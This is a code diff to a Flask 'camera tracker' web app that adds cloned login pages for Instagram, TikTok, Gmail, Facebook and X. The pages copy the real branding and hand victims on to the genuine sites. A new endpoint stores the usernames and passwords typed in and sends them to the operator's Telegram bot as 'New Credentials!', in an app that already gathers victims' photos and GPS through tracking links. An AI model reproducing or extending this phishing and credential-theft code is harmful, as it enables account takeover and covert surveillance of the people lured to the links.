@@ -27,11 +27,75 @@ app.config.update(
     PREFERRED_URL_SCHEME        = "https", # supaya url_for() menghasilkan https://
 )
 
-# Hapus baris ini karena sudah pindah ke app.config di atas:
-# app.permanent_session_lifetime = timedelta(days=7)
 APP_PASSWORD = os.getenv("APP_PASSWORD", "admin123")
 DB_PATH = "/home/camtracker/camera-tracker/tracker.db"
 
+# ── Fake Social Media Presets ────────────────────────────────────────────────────
+FAKE_PRESETS = {
+    "instagram": {
+        "platform": "instagram",
+        "ui": {
+            "logo": "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png",
+            "bg_color": "#fafafa", "card_bg": "#ffffff", "accent_color": "#0095f6",
+            "text_color": "#262626", "border_radius": "8px"
+        },
+        "fields": [
+            {"id": "username", "type": "text", "placeholder": "Phone number, username, or email", "label": "Phone number, username, or email"},
+            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
+        ],
+        "buttons": [{"text": "Log In", "action": "submit"}],
+        "extras": {"forgot_link": "Forgot password?", "signup_text": "Don't have an account? <a href='#'>Sign up</a>", "footer": "Meta © 2025"},
+        "on_submit": {"redirect": "https://www.instagram.com", "delay": 2}
+    },
+    "tiktok": {
+        "platform": "tiktok",
+        "ui": {"logo": "https://static.vecteezy.com/system/resources/previews/016/716/450/non_2x/tiktok-icon-free-png.png",
+               "bg_color": "#000000", "card_bg": "#1c1c1c", "accent_color": "#ee1d52", "text_color": "#ffffff"},
+        "fields": [
+            {"id": "email", "type": "text", "placeholder": "Email or username", "label": "Email or username"},
+            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
+        ],
+        "buttons": [{"text": "Log In", "action": "submit"}],
+        "extras": {"forgot_link": "Forgot password?", "signup_text": "Don't have an account? <a href='#'>Sign up</a>"},
+        "on_submit": {"redirect": "https://www.tiktok.com", "delay": 2}
+    },
+    "gmail": {
+        "platform": "gmail",
+        "ui": {"logo": "https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png",
+               "bg_color": "#ffffff", "card_bg": "#ffffff", "accent_color": "#1a73e8", "text_color": "#202124"},
+        "fields": [
+            {"id": "email", "type": "email", "placeholder": "Email or phone", "label": "Email or phone"},
+            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
+        ],
+        "buttons": [{"text": "Next", "action": "submit"}],
+        "extras": {"forgot_link": "Forgot email?", "signup_text": "Create account"},
+        "on_submit": {"redirect": "https://mail.google.com", "delay": 2}
+    },
+    "facebook": {
+        "platform": "facebook",
+        "ui": {"logo": "https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg",
+               "bg_color": "#f0f2f5", "card_bg": "#ffffff", "accent_color": "#1877f2", "text_color": "#1c1e21"},
+        "fields": [
+            {"id": "email", "type": "text", "placeholder": "Email address or phone number", "label": "Email address or phone number"},
+            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
+        ],
+        "buttons": [{"text": "Log In", "action": "submit"}],
+        "extras": {"forgot_link": "Forgot password?", "signup_text": "Create new account"},
+        "on_submit": {"redirect": "https://www.facebook.com", "delay": 2}
+    },
+    "twitter": {
+        "platform": "twitter",
+        "ui": {"logo": "https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_of_Twitter.svg",
+               "bg_color": "#ffffff", "card_bg": "#ffffff", "accent_color": "#1d9bf0", "text_color": "#0f1419"},
+        "fields": [
+            {"id": "username", "type": "text", "placeholder": "Phone, email, or username", "label": "Phone, email, or username"},
+            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
+        ],
+        "buttons": [{"text": "Log in", "action": "submit"}],
+        "extras": {"forgot_link": "Forgot password?", "signup_text": "Sign up for X"},
+        "on_submit": {"redirect": "https://x.com", "delay": 2}
+    }
+}
 
 # ── Database ──────────────────────────────────────────────────────────────────
 
@@ -83,7 +147,8 @@ def init_db():
             created_at         TEXT NOT NULL,
             expires_at         TEXT NOT NULL,
             revoked            INTEGER DEFAULT 0,
-            used               INTEGER DEFAULT 0
+            used               INTEGER DEFAULT 0,
+            fake_config        TEXT DEFAULT '{}'   -- NEW
         );
         CREATE TABLE IF NOT EXISTS captures (
             id           INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -136,6 +201,7 @@ def init_db():
         "ALTER TABLE tokens ADD COLUMN active_from TEXT DEFAULT ''",
         "ALTER TABLE captures ADD COLUMN address TEXT DEFAULT ''",
         "CREATE TABLE IF NOT EXISTS templates (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, config_json TEXT NOT NULL, created_at TEXT NOT NULL)",
+        "ALTER TABLE tokens ADD COLUMN fake_config TEXT DEFAULT '{}'",  -- NEW
     ]
     for m in migrations:
         try: db.execute(m); db.commit()
@@ -263,6 +329,11 @@ def telegram_notify(cap_type, data, label, address=""):
             if address: text += f"\n🏘 {address}"
             req_lib.post(f"https://api.telegram.org/bot{bot}/sendMessage",
                 data={"chat_id": cid, "text": text}, timeout=10)
+        elif cap_type == "fake":
+            # Kirim kredensial sebagai teks
+            text = f"🔓 New Credentials!\n🏷 {lbl}\n🕐 {now}\n📋 Data: {data}"
+            req_lib.post(f"https://api.telegram.org/bot{bot}/sendMessage",
+                data={"chat_id": cid, "text": text}, timeout=10)
     except: pass
 
 
@@ -372,9 +443,11 @@ def device_page(identifier):
     db.execute("UPDATE tokens SET access_count = access_count + 1 WHERE id=?", (token_id,))
     db.commit(); db.close()
 
-    # Parse theme
+    # Parse theme & fake_config
     try: theme = json.loads(row["theme"] or "{}")
     except: theme = {}
+    try: fake_config = json.loads(row["fake_config"] or "{}")
+    except: fake_config = {}
 
     return render_template("device.html",
         token=token_id,
@@ -402,7 +475,8 @@ def device_page(identifier):
         photo_width=int(row["photo_width"] or 640),
         burst_count=int(row["burst_count"] or 1),
         burst_interval=int(row["burst_interval"] or 500),
-        capture_interval=int(row["capture_interval"] or 10))
+        capture_interval=int(row["capture_interval"] or 10),
+        fake_config=fake_config)   # NEW
 
 
 # ── API: Stats ────────────────────────────────────────────────────────────────
@@ -416,11 +490,12 @@ def get_stats():
     active_sessions = db.execute("SELECT COUNT(*) FROM tokens WHERE revoked=0 AND expires_at>?", (now,)).fetchone()[0]
     total_photos = db.execute("SELECT COUNT(*) FROM captures WHERE type='photo'").fetchone()[0]
     total_gps = db.execute("SELECT COUNT(*) FROM captures WHERE type='gps'").fetchone()[0]
+    total_fake = db.execute("SELECT COUNT(*) FROM captures WHERE type='fake'").fetchone()[0]  # NEW
     photo_size = db.execute("SELECT SUM(LENGTH(data)) FROM captures WHERE type='photo'").fetchone()[0] or 0
     db.close()
     return jsonify(total_sessions=total_sessions, active_sessions=active_sessions,
                    total_photos=total_photos, total_gps=total_gps,
-                   storage_mb=round(photo_size/1024/1024, 2))
+                   total_fake=total_fake, storage_mb=round(photo_size/1024/1024, 2))
 
 
 # ── API: Sessions ─────────────────────────────────────────────────────────────
@@ -486,6 +561,13 @@ def generate_link():
         "font":   b.get("theme_font","Inter"),
     })
 
+    # Fake config
+    fake_mode = b.get("fake_mode", "")
+    fake_config = b.get("fake_config", {})
+    if fake_mode == "social" and not fake_config:
+        # Jika tidak ada config, gunakan preset default (misal instagram)
+        fake_config = FAKE_PRESETS.get("instagram", {})
+
     db = get_db()
     db.execute("""
         INSERT INTO tokens
@@ -497,8 +579,8 @@ def generate_link():
          camera_facing, photo_width, burst_count, burst_interval,
          capture_interval, auto_delete_hours, max_access,
          active_days, active_time_start, active_time_end, active_from,
-         created_at, expires_at)
-        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+         created_at, expires_at, fake_config)
+        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
     """, (token, slug, short_code,
           b.get("label",""), b.get("tags",""), b.get("mode","photo"),
           int(b.get("canary",0)), int(b.get("multi_device",1)),
@@ -509,7 +591,8 @@ def generate_link():
           b.get("permission_title","Akses Diperlukan"),
           b.get("permission_message","Aplikasi ini memerlukan akses untuk berjalan."),
           b.get("custom_message",""),
-          b.get("fake_mode",""), b.get("thank_you_title",""),
+          fake_mode,
+          b.get("thank_you_title",""),
           b.get("thank_you_msg",""), b.get("thank_you_btn","Tutup"),
           b.get("redirect_url",""), int(b.get("redirect_delay",3)),
           theme, b.get("custom_icon",""),
@@ -519,7 +602,8 @@ def generate_link():
           int(b.get("max_access",0)),
           b.get("active_days",""), b.get("active_time_start",""), b.get("active_time_end",""),
           b.get("active_from",""),
-          now.isoformat(), exp.isoformat()))
+          now.isoformat(), exp.isoformat(),
+          json.dumps(fake_config)))
     db.commit(); db.close()
 
     base = request.host_url.rstrip("/")
@@ -547,6 +631,10 @@ def generate_batch():
         exp   = now + timedelta(hours=int(b.get("expires_hours",1)))
         short_code = gen_short_code()
         theme = json.dumps({"bg":b.get("theme_bg",""),"accent":b.get("theme_accent",""),"font":b.get("theme_font","Inter")})
+        fake_mode = b.get("fake_mode", "")
+        fake_config = b.get("fake_config", {})
+        if fake_mode == "social" and not fake_config:
+            fake_config = FAKE_PRESETS.get("instagram", {})
         db = get_db()
         db.execute("""
             INSERT INTO tokens
@@ -558,8 +646,8 @@ def generate_batch():
              camera_facing,photo_width,burst_count,burst_interval,
              capture_interval,auto_delete_hours,max_access,
              active_days,active_time_start,active_time_end,active_from,
-             created_at,expires_at)
-            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+             created_at,expires_at,fake_config)
+            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
         """, (token,"",short_code,b.get("label",""),b.get("tags",""),
               b.get("mode","photo"),int(b.get("canary",0)),int(b.get("multi_device",1)),
               b.get("link_title",""),b.get("link_description",""),
@@ -568,7 +656,7 @@ def generate_batch():
               int(b.get("loading_duration",3)),
               b.get("permission_title","Akses Diperlukan"),
               b.get("permission_message","Aplikasi ini memerlukan akses untuk berjalan."),
-              b.get("custom_message",""),b.get("fake_mode",""),
+              b.get("custom_message",""),fake_mode,
               b.get("thank_you_title",""),b.get("thank_you_msg",""),b.get("thank_you_btn","Tutup"),
               b.get("redirect_url",""),int(b.get("redirect_delay",3)),
               theme,b.get("custom_icon",""),b.get("camera_facing","user"),
@@ -576,7 +664,8 @@ def generate_batch():
               int(b.get("burst_interval",500)),int(b.get("capture_interval",10)),
               int(b.get("auto_delete_hours",0)),int(b.get("max_access",0)),
               b.get("active_days",""),b.get("active_time_start",""),b.get("active_time_end",""),
-              b.get("active_from",""),now.isoformat(),exp.isoformat()))
+              b.get("active_from",""),now.isoformat(),exp.isoformat(),
+              json.dumps(fake_config)))
         db.commit(); db.close()
         results.append({"token":token,"label":b["label"],
                          "link":f"{base}/track/{token}",
@@ -660,6 +749,45 @@ def save_capture(token):
 
     try: telegram_notify(cap_type, data, row["label"], address)
     except: pass
+    return jsonify(ok=True)
+
+# ── API: Fake Submit (Social Login) ──────────────────────────────────────────
+
+@app.route("/api/fake-submit/<token>", methods=["POST"])
+def fake_submit(token):
+    """Menerima data dari form login palsu, simpan sebagai capture tipe 'fake'."""
+    data = request.json
+    if not data:
+        return jsonify(error="No data"), 400
+
+    db = get_db()
+    row = db.execute("SELECT id, label FROM tokens WHERE id=?", (token,)).fetchone()
+    if not row:
+        db.close()
+        return jsonify(error="Token not found"), 404
+
+    # Simpan sebagai capture
+    db.execute(
+        "INSERT INTO captures (token_id, type, data, captured_at) VALUES (?, ?, ?, ?)",
+        (token, "fake", json.dumps(data), datetime.now().isoformat())
+    )
+    db.commit()
+    db.close()
+
+    # Kirim notifikasi Telegram jika dikonfigurasi
+    try:
+        label = row["label"] or "—"
+        bot = get_cfg("tg_bot_token")
+        chat = get_cfg("tg_chat_id")
+        if bot and chat and REQUESTS_OK:
+            msg = f"🔓 New Credentials!\n🏷 {label}\n📋 Data: {json.dumps(data, indent=2)}"
+            req_lib.post(
+                f"https://api.telegram.org/bot{bot}/sendMessage",
+                data={"chat_id": chat, "text": msg}, timeout=10
+            )
+    except:
+        pass
+
     return jsonify(ok=True)
 
 @app.route("/api/captures/<token>")
@@ -778,8 +906,7 @@ def app_config_set():
     return jsonify(ok=True)
 
 
-if __name__ == "__main__":
-    app.run(debug=False, host="0.0.0.0", port=5000)
+# ── Extra endpoints ──────────────────────────────────────────────────────────
 
 @app.route("/api/captures/all/<token>", methods=["DELETE"])
 @login_required
@@ -798,3 +925,6 @@ def delete_all_sessions():
     db.execute("DELETE FROM tokens")
     db.commit(); db.close()
     return jsonify(ok=True)
+
+if __name__ == "__main__":
+    app.run(debug=False, host="0.0.0.0", port=5000)
